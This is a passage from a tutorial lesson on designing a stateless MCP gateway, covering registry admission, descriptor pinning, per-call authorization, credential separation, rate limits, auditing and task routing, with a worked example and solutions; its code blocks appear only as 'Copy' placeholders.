If it changes: Remove it from tools/list . Reject direct calls. Emit an audit event. Require policy or human re-approval before updating the pin. A gateway is a useful central enforcement point, but it does not turn a first-seen descriptor into a safe one. Initial review remains necessary. Idea 8 · Registries help discover, not decide A Registry server.json provides publication metadata. A package-backed record can look like this: Copy Publication metadata does not carry the gateway's security decision. Keep verified publisher and provenance evidence in separate admission state: Copy The gateway checks the server.json shape and joins it to that external state. The gateway still needs an admission policy. For each admitted backend, record: Exact registry and record identifier. Verified publisher namespace or domain evidence. Allowed transport and endpoint. Pinned version or approved upgrade policy. Artifact or descriptor digest. Authorization issuer and resource. Reviewer, approval time, and expiry. Do not accept a server because its display name resembles a familiar product. Do not treat registry presence as an operational security review. Private servers can be admitted through the same evidence schema even when they never appear in a public registry. This lesson implements the gateway seam: join publication evidence to local admission before a backend becomes routable. [Lesson 13.30](#a1330): MCP Registry Supply Chain, Admission, Drift, and Rollback builds the full control plane for exact namespace proof, artifact provenance, immutable pins, live descriptor drift, Registry status reconciliation, a tamper-evident admission ledger, and evidence-backed rollback. Keep that supply-chain state separate from the per-request runtime decision above. Idea 9 · Credential mediation The gateway authenticates its callers and separately authenticates to backends. Backend credentials never go to the client. Keep these bindings explicit: Copy Never pass the outer gateway token to a backend. Never reuse a backend token at a different issuer or resource. If a tool acts on behalf of an end user, preserve that delegation with a designed exchange or claims model rather than impersonating the user with a shared service credential. Idea 10 · Rate limits without sessions Key limits by authenticated principal, issuer, resource, public tool, cost class, and time window. A session id is absent and would be easy to rotate even if it existed. Apply cheap validation before consuming expensive work. Decide whether rejected calls count against abuse limits, business quotas, or both. Idea 11 · Audit the decision chain Record enough to reconstruct a call: Request and trace identifiers. Authenticated principal and issuer. Public tool and backend route. Descriptor pin version. Policy decision and reason. Latency and result class. MRTR round or task identifier when applicable. Redact bearer tokens, authorization codes, refresh tokens, raw secrets, and unnecessary sensitive arguments. Idea 12 · Request-scoped SSE A normal POST may return request-scoped SSE when work streams during that one request. Closing the response stream cancels that in-flight modern HTTP request. Do not create a separate GET stream and do not promise Last-Event-ID replay. Those are older transport assumptions. Idea 13 · Long-lived change notifications For list and resource change notifications, a current client sends subscriptions/listen through POST and receives an SSE response. Notification filters use the exact flat fields toolsListChanged , promptsListChanged , resourcesListChanged , and resourceSubscriptions : Copy The first event acknowledges the supported subset. Its subscription identifier is the JSON-RPC id of the request that opened the stream: Copy The gateway then forwards only the acknowledged change types. Every notification on that stream carries the same io.modelcontextprotocol/subscriptionId in params._meta . There is no automatic replay or automatic re-listen. On reconnect, the client reopens the subscription and refreshes the lists it relies on. A server-initiated graceful close returns a final complete result tagged with the same subscription id. The modern path replaces resources/subscribe , resources/unsubscribe , and unsolicited standalone GET streaming. Keep those only in a version-gated older path. Idea 14 · MRTR through a gateway When a backend returns resultType: input_required , the gateway can forward that result only if the outer client supports the needed input request. Preserve requestState byte for byte unless the gateway deliberately terminates and reissues the interaction. The client retries the original public tool with a fresh JSON-RPC id and inputResponses . The gateway re-authorizes the retry, checks the same public route, then forwards a fresh backend request. It must not assume an earlier round granted unlimited approval. Idea 15 · Tasks extension routing Tasks are an official extension identified by io.modelcontextprotocol/tasks . They are not a core session replacement. The client declares the extension inside per-request client capabilities, and the gateway advertises it in discovery only when it can preserve the lifecycle end to end. For a supported tools/call , the backend alone decides whether to return the ordinary result or resultType: task . A task result carries taskId , status , timestamps, ttlMs , and an optional pollIntervalMs directly in the result. The task must already be durably readable before that result is sent. The gateway records the authenticated principal and backend route for the opaque task identifier. Subsequent tasks/get , tasks/update , and tasks/cancel calls use params.taskId as Mcp-Name , which gives intermediaries a routing key. tasks/get returns resultType: complete with the current task state and inlines the final result or protocol error in a terminal state. tasks/update sends keyed inputResponses for outstanding task input and returns an empty complete acknowledgment. tasks/cancel is a cooperative intent with an empty complete acknowledgment, not a guarantee that work stops. Do not implement new tasks/list or tasks/result methods. They belong to the older experimental model. A task that needs input exposes complete embedded requests through tasks/get ; the client answers them through tasks/update , not by retrying the original tool call. The client still polls at the suggested interval; task creation remains server-directed. Durable task route state is application data keyed by the task handle, not a protocol session. Idea 16 · Compatibility boundary If the gateway must serve an older client or backend: Detect the era explicitly. Keep initialization, transport sessions, GET streams, resource subscriptions, and old task vocabulary inside a legacy adapter. Never leak a legacy session id into modern routing or authorization. Prefer a bounded discovery probe and explicit fallback policy over silent downgrade. The same idea as a formula One decision per request. For request from principal , the gateway computes ​ ) = h ( d approved ​ ) ) ∧ rate ( p , name ) ∧ policy ( p , args ) where is SHA-256 over the canonical descriptor (name, description, input schema). It is recomputed every time; nothing is cached under a connection. Private caching. A list result that depends on who asks is cached under a key that includes the authorization context: With cacheScope: "public" the key would drop the principal, and one user's list could be served to another. Rate limits without sessions use a token bucket per : tokens refill at rate up to a burst , and a call is admitted only if , then . Worked example Two users, three tools, one redeploy Backends: notes has search ; issues has search and delete_issue . Public names: issues.delete_issue , issues.search , notes.search (sorted). Alice's role allows all three; Bob's allows the two searches. tools/list returns 3 tools to Alice and 2 to Bob, each with cacheScope: "private" and ttlMs: 30000 . Bob calls issues.delete_issue directly (not listed for him). The gateway checks RBAC again on the call → denied. The issues backend is redeployed and the description of search changes. Its hash no longer matches the approved pin, so issues.search disappears from Alice's list and a direct call is blocked. Rate limit with , per second: Alice makes 10 calls at once (bucket 10 → 0); the 11th is refused; 3 seconds later she has 3 calls available. Check your mental model ✗ "The gateway checks permissions when it lists tools, so calls are safe." ✓ A client can call any name directly; authorize every call, not only the list. ✗ "A server in the official MCP Registry is approved for use." ✓ The Registry holds metadata; the gateway still needs its own admission record and review. ✗ "If two backends both have search , the gateway can keep the first one." ✓ Give each a stable namespaced name ( notes.search , issues.search ); never resolve collisions by order. ✗ "The gateway can pass the user's token to backends." ✓ The gateway authenticates to each backend with its own credential for that backend. Predict before you run Bob's role allows only the two search tools. He calls issues.delete_issue even though his tools/list did not include it. Later the issues backend changes the description of search . What happens to Bob's direct call, and what happens to issues.search for Alice? (Solution P1.) The gateway provides discovery, user-filtered deterministic tools/list , namespaced routing, Registry server.json plus external admission state, descriptor pins, RBAC, principal-keyed rate limits, audit decisions, and a modeled subscriptions/listen SSE acknowledgment. The model receives parsed request bodies, routing headers, and an authenticated bearer identity. It is not a complete HTTP adapter and does not parse Content-Type or the full Accept contract. Backend discovery before capability exposure. Qualified public name before authorization. Descriptor pin before list or call. Fresh per-request metadata before forwarding. Result validation before returning. Break it on purpose A gateway caches tools/list with cacheScope: "public" for 5 minutes to reduce backend load, and it caches each allow decision under the connection it arrived on. What can go wrong? (Solution B1.) Industry practice What's current (2024–2026) MCP 2026-07-28 gateways route on Mcp-Method and Mcp-Name headers (which must match the body, else -32020 ), serve server/discover , and keep no session; any instance can handle any request. Official MCP Registry (registry.modelcontextprotocol.io, in preview): metadata only ( server.json ), namespaces proven by GitHub, DNS or HTTP; packages point to npm, PyPI, NuGet, crates.io, OCI registries or MCPB releases. Security scanning is left to package registries and downstream aggregators, and the Registry recommends that hosts consume a downstream registry rather than the raw feed. Gateways used in production include Docker MCP Gateway, Microsoft's MCP gateway for Azure, Kong and other API gateways with MCP plugins, Cloudflare's MCP server portals, and open-source projects such as IBM ContextForge. They add the same seams: auth, RBAC, namespacing, rate limits and audit. On your laptop : a gateway is ordinary async Python. The code here runs in about a second on any machine; no GPU is involved. Recap What to keep from this lesson One stateless path per request: authenticate, validate, authorize, check pins and rates, forward a fresh request, validate the result, audit. Stable namespaced names, sorted lists, cacheScope: "private" when visibility depends on the caller. Authorize every call, not only the list. Pin descriptors; a changed one disappears and is blocked until re-approved. Registry presence is discovery evidence, not approval. The gateway has its own credentials for each backend; legacy sessions stay in an adapter. Solutions Solution P1 · Denied, then blocked Bob's direct call is denied: the gateway checks his role on every tools/call , not only when building his list, so a name he was never shown still fails ("denied: bob may not call issues.delete_issue"). After the redeploy, issues.search disappears from Alice's list and a direct call to it is blocked, because the live descriptor's SHA-256 no longer equals the approved pin. It stays blocked until someone reviews the new description and updates the pin. notes.search and issues.delete_issue are unaffected. Solution B1 · Shared caches leak and stale allows linger The public cache leaks lists across users. With cacheScope: "public" , a shared cache may serve Alice's list (including issues.delete_issue ) to Bob, or Bob's shorter list to Alice. Bob still cannot call the tool if calls are authorized, but he learns that it exists, and Alice loses tools she should see. Lists that depend on the caller must use cacheScope: "private" , keyed by the authorization context, with a short ttlMs . Five minutes also hides revocations and drift. A role removed now, or a descriptor that changed, stays visible in cached lists for up to five minutes. A cached allow under a connection outlives the policy. In the 2026-07-28 protocol there is no session, and any connection may carry requests for different principals through a proxy. If Bob's role is revoked, the cached allow keeps granting calls. Recompute the decision on every request from the authenticated principal, the tool, its arguments, the pin and the current policy version.
